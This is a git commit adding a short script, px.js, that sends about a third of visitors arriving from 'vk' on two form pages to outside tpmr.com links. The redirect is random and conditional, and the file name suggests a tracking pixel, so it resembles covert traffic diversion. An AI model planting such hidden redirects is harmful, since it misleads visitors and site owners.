dd70b9a3a234a7bc48241fdf94480eb3ad55817b
Aleksandr Mironenko <baffipelo@gmail.com>
2019-06-27 00:16:36 +0300

    Create px.js

---
+++ px.js
@@ -0,0 +1,8 @@
+var urlParams = new URLSearchParams(window.location.search); var myParam = urlParams.get('utm_source'); 
+var foo = (Math.random() * (10 - 1) + 1)>7
+
+if (foo && (myParam == 'vk') && (document.location.pathname == '/forms/registration/')){
+ document.location.replace('http://tpmr.com/i/66194') }
+ 
+ if (foo && (myParam == 'vk') && (document.location.pathname == '/forms/feed/')){
+ document.location.replace('http://tpmr.com/i/66230') }
